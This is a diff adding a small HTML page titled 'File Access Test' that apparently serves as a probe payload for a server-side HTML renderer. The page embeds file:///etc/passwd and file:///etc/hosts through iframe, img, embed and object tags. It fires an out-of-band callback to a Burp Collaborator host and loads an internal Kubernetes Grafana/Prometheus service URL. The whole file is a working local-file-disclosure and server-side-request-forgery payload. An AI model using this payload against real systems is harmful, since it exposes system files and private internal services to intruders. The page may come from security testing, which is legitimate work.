@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>File Access Test</h1>
+
+<!-- Try various file:// syntaxes -->
+<iframe src="file:///etc/hosts" width="100%" height="400"></iframe>
+<hr>
+<iframe src="file:///etc/passwd" width="100%" height="400"></iframe>
+<hr>
+<img src="file:///etc/hosts" alt="hosts file">
+<hr>
+
+<!-- Try with different protocols -->
+<embed src="file:///etc/hosts" type="text/plain" width="100%" height="400">
+<hr>
+<object data="file:///etc/hosts" type="text/plain" width="100%" height="400"></object>
+
+
+<iframe src="http://m7uw7oqr00992jkaswetepejcai16sxgm.burp.17.rs" width="100%" height="400"></iframe>
+
+
+<iframe src="http://prometheus-grafana.monitoring-system.svc.cluster.local/" width="100%" height="400"></iframe>
+
+</body>
+</html>
